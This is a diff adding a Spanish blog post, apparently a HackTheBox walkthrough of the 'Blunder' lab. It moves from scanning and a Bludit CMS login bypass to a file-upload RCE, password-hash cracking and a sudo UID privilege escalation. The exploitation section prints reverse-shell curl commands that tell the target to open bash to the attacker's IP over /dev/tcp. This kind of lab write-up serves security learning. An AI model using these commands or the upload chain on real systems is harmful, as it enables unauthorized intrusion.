@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Blunder</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Blunder | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Blunder" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel fácil. Romperemos un CMS, encontraremos un File Upload que explotaremos para ejecutar comandos. Crackearemos cositas y nos apoyaremos de una locura relacionada con “sudo -l” para convertirnos en administradores del sistema." />
+<meta property="og:description" content="Máquina Linux nivel fácil. Romperemos un CMS, encontraremos un File Upload que explotaremos para ejecutar comandos. Crackearemos cositas y nos apoyaremos de una locura relacionada con “sudo -l” para convertirnos en administradores del sistema." />
+<link rel="canonical" href="http://localhost:4000/htb/blunder" />
+<meta property="og:url" content="http://localhost:4000/htb/blunder" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/bannerblunder.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-10-17T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/bannerblunder.png" />
+<meta property="twitter:title" content="HackTheBox - Blunder" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2020-10-17T00:00:00-07:00","datePublished":"2020-10-17T00:00:00-07:00","description":"Máquina Linux nivel fácil. Romperemos un CMS, encontraremos un File Upload que explotaremos para ejecutar comandos. Crackearemos cositas y nos apoyaremos de una locura relacionada con “sudo -l” para convertirnos en administradores del sistema.","headline":"HackTheBox - Blunder","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/bannerblunder.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/blunder"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/blunder"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Blunder</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2020-10-17">17 Oct 2020</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/bannerblunder.png" alt="HackTheBox - Blunder">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel fácil. Romperemos un CMS, encontraremos un File Upload que explotaremos para ejecutar comandos. Crackearemos cositas y nos apoyaremos de una locura relacionada con “sudo -l” para convertirnos en administradores del sistema.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/blunderHTB.png" alt="blunderHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p>Wenas, en esta máquina nos encontraremos con el puerto 80, el cual haciéndole un poco de fuzzing se nos listaran: un apartado <code>/admin</code> y un archivo <code>/todo.txt</code>. En <strong>/admin</strong> hay un login y encontraremos que el servicio está siendo soportado por él <code>CMS Bludit</code>, basado en ello encontraremos un exploit que hace un bypass del login, con esto (y haciendo un diccionario del sitio) lograremos entrar al dashboard como el usuario <code>fergus</code>.</p>
+
+<p>Estando dentro explotaremos una vulnerabilidad <code>file upload</code>, cambiaremos su contenido y pondremos código <code>.php</code> que nos permita ejecutar comandos en el sistema y así obtener una reverse Shell. Estando dentro de la máquina como <code>www-data</code> encontraremos en la estructura del CMS un archivo <code>users.php</code> en el que se listan hashes e información útil de algunos usuarios, crackearemos el <code>hash</code> de <code>hugo</code> para usar esa contraseña y obtener una sesión como él.</p>
+
+<p>Realizando enumeración básica (<code>sudo -l</code>) veremos algo raro, nos apoyaremos en esa locura para buscar y encontrar una manera de obtener una Shell como usuario <code>root</code>. Démosle :)</p>
+
+<ul>
+  <li>Apoyado en un exploit (que abajo listaré) cree un <a href="https://github.com/lanzt/blog/tree/main/assets/scripts/HTB/blunder/autopwn_blunder.py">autopwn</a> en python para obtener una shell desde el mismo programa (:</li>
+</ul>
+
+<blockquote>
+  <p>Claramente vas a encontrar mucho texto, pero como he dicho en otros writeups, me enfoco en plasmar mis errores y existos, asi mismo aveces explico algo de más y me inspiro hablando (:</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Tendremos 3 fases.</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración</h2>
+
+<p>Como siempre, iniciamos haciendo un escaneo de puertos para así conocer que servicios está corriendo la maquina. En este caso con parámetros normales el escaneo va lento, así que le agregamos algunos para acelerar el proceso.</p>
+
+<pre><code class="language-bash">$ nmap -vvv -sS -Pn --min-rate=5000 -p- --open 10.10.10.191 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-vvv</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-sS</td>
+      <td style="text-align: left">Quita la opción por defecto TCP SYN, así evitamos que haga una petición de conexión</td>
+    </tr>
+    <tr>
+      <td>-Pn</td>
+      <td style="text-align: left">Evita que realice Host Discovery, como resolución DNS y Ping</td>
+    </tr>
+    <tr>
+      <td>–min-rate</td>
+      <td style="text-align: left">Indica que no queremos hacer peticiones menores al num que pongamos</td>
+    </tr>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los puertos</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/initScan.png" alt="nmapInitScan" /></p>
+
+<p>Ahora hacemos el escaneo para verificar que versión y que scripts puede manejar el servicio que encontramos.</p>
+
+<pre><code class="language-bash">$ nmap -sC -sV -p80 10.10.10.191 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/portScan.png" alt="nmaPortScan" /></p>
+
+<p>Tenemos el puerto 80, una pagina web, veamo que se cuece :P</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/webpage.png" alt="webpage" /></p>
+
+<p>No hay nada a primera vista, vamos a hacer fuerza bruta sobre el dominio con <a href="https://github.com/maurosoria/dirsearch"><code>$ dirsearch</code></a>. Solo tenemos un apartado <code>/admin</code> que nos muestra un login y un texto sobre <strong>Bludit</strong>, buscando en internet vemos que es un <em>CMS</em>, por lo tanto sabemos que la pagina esta soportada por este CMS.</p>
+
+<p>Con respecto a <strong>Bludit</strong> ya tenemos otro enfoque, podemos ir a internet o con <em>searchsploit</em> y buscar algún exploit relacionado con ese servicio. Haciendo un research en la documentación y dando vueltas, encontré que la versión que está corriendo de Bludit se puede listar acá:</p>
+
+<pre><code class="language-html">http://10.10.10.191/bl-plugins/version/metadata.json
+</code></pre>
+
+<pre><code class="language-bash">version	"3.9.2"
+</code></pre>
+
+<p>Con <em>searchsploit</em> encontramos un script que hace un <strong>bypass</strong>, saltándose el bloqueo de IP por intentos fallidos al hacer login incorrectamente.</p>
+
+<ul>
+  <li><a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">Exploit 1: rastating - bludit-brute-force-mitigation-bypass</a>.</li>
+  <li><a href="https://github.com/bludit/bludit/pull/1090">Exploit 2: rastating - bypass anti-brute</a>.</li>
+</ul>
+
+<p><strong>El exploit es muy interesante, léanselo! :)</strong></p>
+
+<p>Listo, lo que sigue es tener posibles credenciales y probarlos con él.</p>
+
+<p>Así que tome la página, lei cada artículo para ver que destacaba, nombres, palabras raras, números por ahí al azar. Y con ello armar un wordlist para posteriormente usarlos como <strong>user</strong> y <strong>pw</strong>.</p>
+
+<p>Adecuando el script para que lea el wordlist que le pasemos, quedaria algo asi:</p>
+
+<p>…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/fileinputscript.png" alt="fileinputscript" /></p>
+
+<p>…</p>
+
+<p>Pero no sirvio ninguno :( Sin saber que hacer, usé otra herramienta de <em>fuzz web</em> a ver si era que me habia olvidado algo. Encontre <code>$ gobuster</code>, asi que decidi usarla a ver si con ella podria tener diferentes resultados.</p>
+
+<pre><code class="language-bash">$ gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/directory-list-2.3-small.txt -t 30 -x .html,.php,.txt,.js
+</code></pre>
+
+<ul>
+  <li><strong>-u</strong>: Le indico el objetivo</li>
+  <li><strong>-w</strong>: El path del wordlist con el que quiero probar</li>
+  <li><strong>-t</strong>: Los hilos con los que debe correr el proceso</li>
+  <li><strong>-x</strong>: Las extensiones a buscar</li>
+</ul>
+
+<p>Efectivamente, algo no habia aparecido con <code>$ dirsearch</code>, <strong>todo.txt</strong>.</p>
+
+<pre><code class="language-html">http://10.10.10.191/todo.txt
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/todo_txt.png" alt="todotxt" /></p>
+
+<p>Perfecto, obtenemos un presunto nombre/usuario, <strong>fergus</strong>. Pero ¿y su contraseña?, pues usando la wordlist podemos probar :)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/ferguslogin.png" alt="ferguslogin" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/fergusdashboard.png" alt="fergusdashboard" /></p>
+
+<p>Listo, baby… dentro. Buscando en internet encontré una vulnerablidad que explota una funcionalidad para subir imagenes en <code>/new-content</code>, permitiendo <strong>corromper el contenido</strong> del archivo en cuestión. Asi que si se sube un archivo <code>.jpg</code> pero con <strong>contenido <code>php</code></strong> se podra conseguir ejecutar comandos (o lo que sea) con php (:</p>
+
+<p>En este caso con el archivo que subiremos, podremos ejecutar comandos y finalmente crear una reverse shell.</p>
+
+<ul>
+  <li><a href="https://github.com/bludit/bludit/issues/1081">POC del exploit</a>.</li>
+</ul>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación</h2>
+
+<p>Deeeeeeeespues de mucho sufrimiento, confundido con el POC por que simplemente siguiendo los pasos no obtenia nada, intente algo diferente (sencillo, basico y que debi probar al inicio :P) un RCE con un simple <strong>system</strong> y <strong>echo</strong>. Logre obtener resultados, hice estos pasos:</p>
+
+<ul>
+  <li>Como se muestra en el POC se captura la petición mediante BurpSuite.</li>
+  <li>Se modifica el contenido.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/burpImage.png" alt="burpImage" /></p>
+
+<p>Verificando…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/burpCheckImage.png" alt="burpCheckImage" /></p>
+
+<ul>
+  <li>Subir el archivo <code>.htaccess</code> para que el servidor interprete las imagenes <code>jpg</code> con contenido <code>php</code></li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/burphtaccess.png" alt="burphtaccess" /></p>
+
+<ul>
+  <li>Hacer peticiones hacia el archivo creado, asi validamos que si encuentra el archivo en el sistema</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/burpcontrol.png" alt="burpcontrol" /></p>
+
+<ul>
+  <li>Verificar que podamos ejecutar comandos.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/webRCE.png" alt="webRCE" /></p>
+
+<p>Listo, ahora podemos intentar subir una reverse shell…</p>
+
+<p>Habia probado encodear la URL pero solo lo hice con algunos caracteres, ya que al ejecutar el comando en limpio no pasaba nada, pero despues probé encodear toda la URL y así si me funciono :)</p>
+
+<p>De esto:</p>
+
+<pre><code class="language-bash">$ curl http://10.10.10.191/bl-content/tmp/buenobueno.jpg?xmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.26/443 0&gt;&amp;1'
+</code></pre>
+
+<p>A esto:</p>
+
+<pre><code class="language-bash">$ curl http://10.10.10.191/bl-content/tmp/buenobueno.jpg?xmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.26%2F443%200%3E%261%27
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/revshellwww.png" alt="revshellwww" /></p>
+
+<p>Perfe, el problema es que con la shell que tengo estoy limitado ya que no puedo volver a algun comando que haya escrito, asi que la transformaré para que sea completamente interactiva.</p>
+
+<ul>
+  <li><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Convertir a una shell completamente interactiva</a>.</li>
+  <li><a href="https://netsec.ws/?p=337">Varias opciones</a>.</li>
+  <li><a href="https://www.youtube.com/watch?v=amKkzk-yP14&amp;t=953">Resumido y facil (Gracias s4vitar)</a>.</li>
+</ul>
+
+<p>Ahora si, a seguir enumerando :)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/usersphp.png" alt="usersphp" /></p>
+
+<p>Interesante, primero a saber que tipo de <strong>hash</strong> es y ver si lo podemos romper.</p>
+
+<p>Pues despues de muchos intentos, herramientas online y herramientas del escritorio no logré romper el hash… Sencillamente por que no habia enumerado bien y habia caido en un hoyo para ratones :s <strong>Recuerden, enumeren todo</strong>, pues al ir recorriendo las carpetas vi que hay dos versiones de <strong>bludit</strong> corriendo en el sistema, como era de esperar tiene la misma estructura que la version <code>3.9.2</code>, asi que tenemos el archivo <code>users.php</code>.</p>
+
+<p>El hash presuntamente es <strong>SHA1</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/bludit3_10_0.png" alt="bludit3_10_0" /></p>
+
+<p>Tengo esto :sss</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/hugoHash.png" alt="hugoHash" /></p>
+
+<p>Este hash es tambien <strong>SHA1</strong>, probe instantaneamente con una herramienta online que tenia a la mano. Tambien probé con <strong>john</strong> y <strong>hashcat</strong> pero el problema es que esa password de <strong>hugo</strong> no esta en los wordlist por default o tradicionales.</p>
+
+<blockquote>
+  <p>Además ojeando una carpeta dentro del <code>$ /home</code> de <strong>hugo</strong> llamada <code>/.mozilla</code>, en algunos archivos se hace alusion a <a href="https://crackstation.net/">crackstation</a> como cache o historial.</p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/resultHugoHash.png" alt="resultHugoHash" /></p>
+
+<p>Listo, tenemos un resultado, probando esa password con <strong>hugo</strong> tenemos una shell en el sistema.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/shellHugo.png" alt="shellHugo" /></p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Al ver los permisos que tiene <strong>hugo</strong> me confundi, asi que le cai a google. Basicamente lo que dice es que podemos correr <code>$ /bin/bash</code> con cualquier usuario peeero no con <strong>root</strong>… :(</p>
+
+<p>Pero existe una vulnerabilidad en esa instrucción, en linux el <strong>UID de root es 0</strong>, lo que encontraron es que al asignarle a <code>sudo</code> algunos de estos UID (Identificador de usuario): <code>-1 o 4294967295</code> los interpreta mal y los hace pasar como <code>0</code>, permitiendo asi ejecutar comandos como el usuario <strong>root</strong>.</p>
+
+<ul>
+  <li><a href="https://www.muylinux.com/2019/10/16/vulnerabilidad-sudo-saltarse-restricciones-root/">Explicación 1: muylinux - vulnerabilidad-sudo-saltarse-restricciones-root</a>.</li>
+  <li><a href="https://hackwise.mx/esta-vulnerabilidad-sudo-te-permite-ejecutar-comandos-como-root/">Explicación 2: hackwise.mx - esta-vulnerabilidad-sudo-te-permite-ejecutar-comandos-como-root</a>.</li>
+</ul>
+
+<p>Según eso, la explotación quedaria así:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/roottxt.png" alt="roottxt" /></p>
+
+<p>YyyyyyyyyYYyYyY obtenemos nuestra shell como root (:</p>
+
+<p>Una forma nueva para mi y sencilla de escalar privilegios, el inicio de la maquina fue caotico pero despues me enganche (esta maquina la hice primero que la de <a href="">Magic</a>, por eso en ese writeup comento que me fue mas facil ver la explotacion del apartado <code>/upload</code>) y me gusto mucho, gracias por leer y a seguir rompiendo conocimiento (:</p>
+
+<p>…</p>
+
+<h2 id="autopwn">Autopwn.</h2>
+
+<p>Apoyandome en un <a href="https://www.exploit-db.com/exploits/48568">exploit</a> que ejecuta el mismo proceso que realizamos con el POC, cree un <code>.py</code> para obtener una shell desde el mismo programa. (Tambien me apoye en los autopwn de <a href="https://www.youtube.com/c/s4vitar/videos">s4vitar</a>)</p>
+
+<p>Y cuando tengas la shell, pones las lineas (para ser hugo y despues root) que estan en este writeup. (Ya que no entendi como hacerlo en el propio script).</p>
+
+<ul>
+  <li>Acá el <a href="https://github.com/lanzt/blog/tree/main/assets/scripts/HTB/blunder/autopwn_blunder.py">autopwn</a></li>
+</ul>
+
+<p>Bless :)</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Blunder&url=http://localhost:4000/htb/blunder" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#CMS">CMS</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#cracking">cracking</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#file-upload">file-upload</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#sudo">sudo</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/schooled">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335banner.png" alt="HackTheBox - Schooled"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/schooled">HackTheBox - Schooled</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deberíamos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Sep 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/knife">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347banner.png" alt="HackTheBox - Knife"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/knife">HackTheBox - Knife</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil, explotaremos PHP y jugaremos con la herramienta knife para ejecutar código Ruby como el usuario root (mediante sudo).
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">28 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/love">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344banner.png" alt="HackTheBox - Love"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/love">HackTheBox - Love</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil, escanearemos archivos locales (localhost) en busca de malware e.e Encontraremos credenciales y generaremos votantes con fotos de perfil peligrosas… Jugaremos con registros e instalaremos paquetes MSI...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">07 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
